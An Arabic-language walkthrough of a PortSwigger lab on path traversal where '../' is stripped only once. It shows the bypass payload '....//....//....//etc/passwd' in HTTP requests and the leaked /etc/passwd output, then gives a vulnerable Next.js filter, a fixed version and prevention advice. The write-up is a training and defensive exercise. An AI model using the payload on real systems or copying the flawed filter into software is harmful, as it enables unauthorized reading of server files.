# Lab: File path traversal, traversal sequences stripped non-recursively

> **Category:** Path Traversal  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-non-recursive-stripping)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة Path Traversal في عرض صور المنتجات، ولكن هذه المرة الخادم **يحذف تكرارات `../` بشكل غير متكرر (non-recursively)**، لذلك سنستخدم بايلودات مزدوجة مثل `....//` لتجاوز الفلتر.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: الدخول إلى المختبر

- اضغط **Access the lab** لفتح موقع المتجر الوهمي.

### الخطوة 2: تشغيل Burp Suite واعتراض الطلب

- افتح Burp Suite وتأكد من تشغيل الـ Proxy.
- اضغط على أي منتج لعرض صورته.
- في Burp → **Proxy > HTTP history**، ابحث عن الطلب:

```http
GET /image?filename=product1.jpg HTTP/1.1
Host: vulnerable-website.com
```

### الخطوة 3: إرسال الطلب إلى Repeater

- حدد الطلب، زر الماوس الأيمن → **Send to Repeater**.

### الخطوة 4: تجربة الطريقة القديمة (ستفشل)

جرب `../../../etc/passwd` أولاً:
```http
GET /image?filename=../../../etc/passwd HTTP/1.1
```
ستجد أنها **لا تعمل** لأن الخادم يحذف `../`.

### الخطوة 5: فهم آلية الفلتر

الخادم يحذف `../` مرة واحدة فقط (non-recursively).
يعني: `....//` بعد حذف `../` يصبح `../../`

### الخطوة 6: استخدام البايلود المزدوج

غير `filename` إلى:
```
....//....//....//etc/passwd
```

يصبح الطلب:
```http
GET /image?filename=....//....//....//etc/passwd HTTP/1.1
```

### الخطوة 7: إرسال الطلب

- اضغط **Send** في Repeater.

### الخطوة 8: مشاهدة النتيجة

ستظهر استجابة تحتوي على محتوى `/etc/passwd`:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
carlos:x:1001:1001:,,,:/home/carlos:/bin/bash
```

### الخطوة 9: حل المختبر

بمجرد ظهور المحتوى، تم حل المختبر تلقائياً ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **ماذا يعني non-recursively؟** | الفلتر يحذف `../` مرة واحدة فقط، وليس بشكل متكرر |
| **كيف يعمل `....//`؟** | بعد حذف `../` من المنتصف، يتبقى `../../` |
| **لماذا 3 مرات؟** | نحتاج 3 مستويات للخروج من مجلد الصور إلى الجذر |
| **الفرق عن اللاب السابق؟** | السابق كان يمنع، وهذا كان يحذف مرة واحدة |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

الفلتر يحذف `../` بشكل غير متكرر (مرة واحدة فقط)، مما يسمح بتجاوزه باستخدام `....//`.

---

### ❌ Non-Compliant Code (Next.js)

```javascript
const { filename } = req.query;

// خطأ: يحذف ../ مرة واحدة فقط
const safeFilename = filename.replace('../', '');
// مثلاً: ....//....//etc/passwd
// بعد الحذف يصبح: ../../etc/passwd (لا يزال ضاراً)

const filePath = path.join('public/images', safeFilename);
fs.readFileSync(filePath);
```

---

### ✅ Compliant Code (Next.js)

```javascript
const { filename } = req.query;

// التصحيح: حذف متكرر (recursive) حتى إزالة كل الـ ../
let safeFilename = filename;
while (safeFilename.includes('../')) {
  safeFilename = safeFilename.replace('../', '');
}

// أو الأفضل: استخدام path.basename()
const safeFilename2 = path.basename(filename);

const filePath = path.join('public/images', safeFilename2);
fs.readFileSync(filePath);
```

**الخلاصة:** الحذف لمرة واحدة لا يكفي، يجب الحذف المتكرر أو استخدام `path.basename()`.

---

## 🛡️ كيفية الوقاية (How to Prevent)

1. **استخدام `path.basename()`:** يزيل أي مسارات بشكل كامل.
2. **الحذف المتكرر (recursive):** كرر عملية الحذف حتى تختفي كل `../`.
3. **قائمة بيضاء (Whitelist):** حدد أسماء الملفات المسموحة مسبقاً.

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/file-path-traversal/lab-non-recursive-stripping)
- [Path Traversal Cheat Sheet](https://portswigger.net/web-security/file-path-traversal)
